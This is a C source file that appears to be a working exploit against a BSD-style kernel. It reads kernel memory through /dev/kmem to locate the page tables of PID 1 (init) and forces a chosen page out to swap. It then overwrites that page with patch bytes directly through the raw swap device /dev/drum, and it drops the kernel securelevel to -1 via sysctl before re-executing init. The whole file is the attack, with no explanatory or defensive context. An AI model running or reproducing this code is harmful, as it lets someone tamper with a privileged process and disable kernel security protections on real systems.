#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <nlist.h>
#include <kvm.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/sysctl.h>
#include "hashset.h"
#include "init.h"
#include "kern_abi.h"

static int dev_kmem;

typedef uintptr_t usize;
typedef uint32_t u32;

static usize get_alllwp(void) {
    struct nlist nl[2];
    nl[0].n_name = "alllwp";
    nl[1].n_name = NULL;
    if (nlist("/dev/ksyms", nl)) {
        fprintf(stderr, "nlist failed\n");
        exit(0);
    }
    return nl[0].n_value;
}

static usize kreadsize(usize offset) {
    usize ret;
    if (pread(dev_kmem, &ret, sizeof(usize), offset) != sizeof(usize)) {
        perror("pread_failed");
        exit(0);
    }
    return ret;
}

static u32 kread32(usize offset) {
    u32 ret;
    if (pread(dev_kmem, &ret, sizeof(u32), offset) != sizeof(u32)) {
        perror("pread_failed");
        exit(0);
    }
    return ret;
}

static usize pid1_addr(void) {
    hashset_t procs = hashset_create();
    usize lwp = kreadsize(get_alllwp() + offsetof(struct lwplist, lh_first));
    while (lwp) {
        usize proc = kreadsize(lwp + offsetof(struct lwp, l_proc));
        hashset_add(procs, (void*)proc);
        lwp = kreadsize(lwp + offsetof(struct lwp, l_list.le_next));
    }
    hashset_itr_t proc_iter = hashset_iterator(procs);
    do {
        usize proc = hashset_iterator_value(proc_iter);
        if (proc) {
            u32 pid = kread32(proc + offsetof(struct proc, p_pid));
            if (pid == 1) {
                hashset_destroy(procs);
                return proc;
            }
        }
    } while (hashset_iterator_next(proc_iter) != -1);
    fprintf(stderr, "unable to find proc with pid 1\n");
    exit(1);
}

struct entry_ref {
    usize entry_ptr;
    usize start;
};
static struct entry_ref find_entry(usize entry, usize addr) {
    usize start = kreadsize(entry + offsetof(struct vm_map_entry, start));
    usize end = kreadsize(entry + offsetof(struct vm_map_entry, end));
    if (start < addr && addr < end) {
        struct entry_ref er;
        er.entry_ptr = entry;
        er.start = start;
        return er;
    }
    usize rb_node = entry + offsetof(struct vm_map_entry, rb_node);
    if (addr < start) {
        usize left_node = kreadsize(rb_node + offsetof(struct rb_node, rb_nodes[0]));
        return find_entry(left_node, addr);
    } else {
        usize right_node = kreadsize(rb_node + offsetof(struct rb_node, rb_nodes[1]));
        return find_entry(right_node, addr);
    }
}

static usize get_vm_root(usize proc) {
    usize vmspace = kreadsize(proc + offsetof(struct proc, p_vmspace));
    usize vm_map = vmspace + offsetof(struct vmspace, vm_map);
    usize rb_tree = vm_map + 0x24; // offsetof(struct vm_map, rb_tree);
    return kreadsize(rb_tree + offsetof(struct rb_tree, rbt_root));
}

static usize amap_lookup(usize map_entry, usize offset) {
    usize aref = map_entry + offsetof(struct vm_map_entry, aref);
    usize amap = kreadsize(aref + offsetof(struct vm_aref, ar_amap));
    u32 pageoff = kread32(aref + offsetof(struct vm_aref, ar_pageoff));
    usize slot = offset / 4096 + pageoff;
    usize anon_array = kreadsize(amap + offsetof(struct vm_amap, am_anon));
    return kreadsize(anon_array + slot * sizeof(usize));
}

#define TRANSITION_VM_ADDR 0x9c4220

static u32 swap_slot(usize anon) {
    return kread32(anon + offsetof(struct vm_anon, an_swslot));
}

#define PAGES_TO_ALLOC (512 * 1024 * 1024 / 4096)

static void mem_pressure(void) {
    int **pages = malloc(sizeof(int*) * PAGES_TO_ALLOC);
    for (int i = 0; i < PAGES_TO_ALLOC; i++) {
        int *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        *page = (i ^ 42) | 1;
        pages[i] = page;
    }
    for (int i = 0; i < PAGES_TO_ALLOC; i++) {
        munmap(pages[i], 4096);
    }
    free(pages);
}

#define EVICTION_ATTEMPTS 10

static u32 evict_page(usize anon) {
    u32 slot = swap_slot(anon);
    if (slot) {
        return slot;
    }
    for (int i = 0; i < EVICTION_ATTEMPTS; i++) {
        mem_pressure();
        slot = swap_slot(anon);
        if (slot) {
            return slot;
        }
    }
    fprintf(stderr, "Failed to evict page after %d attempts\n", EVICTION_ATTEMPTS);
    exit(0);
}

void do_haxx(void) {
    if ((dev_kmem = open("/dev/kmem", O_RDONLY | O_CLOEXEC)) == -1) {
        perror("open(/dev/kmem) failed");
        return;
    }
    int swap;
    if ((swap = open("/dev/drum", O_RDWR | O_CLOEXEC)) == -1) {
        perror("open(swap) failed");
        return;
    }
    usize proc_pid1 = pid1_addr();
    usize root_entry = get_vm_root(proc_pid1);
    struct entry_ref vm_entry = find_entry(root_entry, TRANSITION_VM_ADDR);
    usize anon = amap_lookup(vm_entry.entry_ptr, TRANSITION_VM_ADDR - vm_entry.start);
    u32 an_swslot = evict_page(anon);
    usize *page = malloc(4096);
    memset(page, 42, 4096);
    pread(swap, page, 4096, an_swslot * 4096);
    page[(TRANSITION_VM_ADDR % 4096) / sizeof(usize)] = 0x0018b948;
    pwrite(swap, page, 4096, an_swslot * 4096);
    free(page);
    int tube[2];
    pipe(tube);
    pid_t pid = fork();
    if (pid == 0) {
        if (fork() == 0) {
            close(tube[1]);
            char byte;
            read(tube[0], &byte, 1);
            exit(0);
        }
        exit(0);
    }
    close(tube[0]);
    int status;
    waitpid(pid, &status, 0);
    char byte = 1;
    write(tube[1], &byte, 1);
}

__attribute__((noreturn))
void set_seclvl(void) {
    int name[2];
    name[0] = CTL_KERN;
    name[1] = KERN_SECURELVL;
    int newlevel = -1;
    sysctl(name, 2, NULL, NULL, &newlevel, sizeof newlevel);
    const char *args[2];
    args[0] = "init";
    args[1] = "--skip-init";
    execv("/sbin/init", (void*)args);
}

int main(int argc, char **argv) {
    if (strstr(argv[0], "run")) {
        set_seclvl();
    }
    if (!strcmp(argv[0], "init")) {
        return init_main(argc, argv);
    }
    do_haxx();
}